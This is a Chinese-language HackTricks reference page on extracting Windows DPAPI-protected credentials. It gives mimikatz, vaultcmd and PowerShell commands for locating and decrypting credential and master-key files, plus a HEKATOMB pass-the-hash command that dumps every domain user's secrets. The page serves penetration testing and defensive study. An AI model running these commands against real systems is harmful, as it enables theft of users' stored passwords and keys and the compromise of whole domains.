# DPAPI - 提取密码

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) 是 **西班牙** 最相关的网络安全事件，也是 **欧洲** 最重要的事件之一。该大会的 **使命是促进技术知识**，是各个学科技术和网络安全专业人士的热烈交流平台。

{% embed url="https://www.rootedcon.com/" %}

## 什么是 DPAPI

数据保护 API (DPAPI) 主要用于 Windows 操作系统中，**对非对称私钥进行对称加密**，利用用户或系统秘密作为重要的熵来源。这种方法简化了开发人员的加密过程，使他们能够使用从用户登录秘密派生的密钥进行数据加密，或者对于系统加密，使用系统的域认证秘密，从而免去开发人员自己管理加密密钥保护的需要。

### DPAPI 保护的数据

DPAPI 保护的个人数据包括：

* Internet Explorer 和 Google Chrome 的密码和自动完成数据
* Outlook 和 Windows Mail 等应用程序的电子邮件和内部 FTP 账户密码
* 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
* 远程桌面连接、.NET Passport 和各种加密和认证目的的私钥密码
* 由凭据管理器管理的网络密码以及使用 CryptProtectData 的应用程序中的个人数据，如 Skype、MSN Messenger 等

## 列表保险库
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Credential Files

受保护的**凭据文件**可能位于：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
使用mimikatz `dpapi::cred`获取凭据信息，在响应中可以找到有趣的信息，例如加密数据和guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
您可以使用 **mimikatz module** `dpapi::cred` 和适当的 `/masterkey` 进行解密：
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 主密钥

用于加密用户 RSA 密钥的 DPAPI 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录下，其中 {SID} 是该用户的 [**安全标识符**](https://en.wikipedia.org/wiki/Security\_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥存储在同一个文件中**。它通常是 64 字节的随机数据。（请注意，此目录受到保护，因此您无法使用 `dir` 从 cmd 列出它，但您可以从 PS 列出它）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
这是用户的一组主密钥的样子：

![](<../../.gitbook/assets/image (1121).png>)

通常**每个主密钥是一个加密的对称密钥，可以解密其他内容**。因此，**提取** **加密的主密钥**是有趣的，以便**稍后解密**用它加密的**其他内容**。

### 提取主密钥并解密

查看帖子 [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) 以获取提取主密钥并解密的示例。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) 是[@gentilkiwi](https://twitter.com/gentilkiwi)的[Mimikatz](https://github.com/gentilkiwi/mimikatz/)项目中某些DPAPI功能的C#移植。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动提取LDAP目录中所有用户和计算机以及通过RPC提取域控制器备份密钥的工具。然后，脚本将解析所有计算机的IP地址，并在所有计算机上执行smbclient以检索所有用户的所有DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从LDAP提取的计算机列表，您可以找到每个子网络，即使您不知道它们！

“因为域管理员权限还不够。黑掉他们所有人。”

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储受DPAPI保护的秘密。

## 参考文献

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最相关的网络安全事件之一，也是**欧洲**最重要的事件之一。该大会**旨在促进技术知识**，是各个学科技术和网络安全专业人士的一个热烈的交流平台。

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
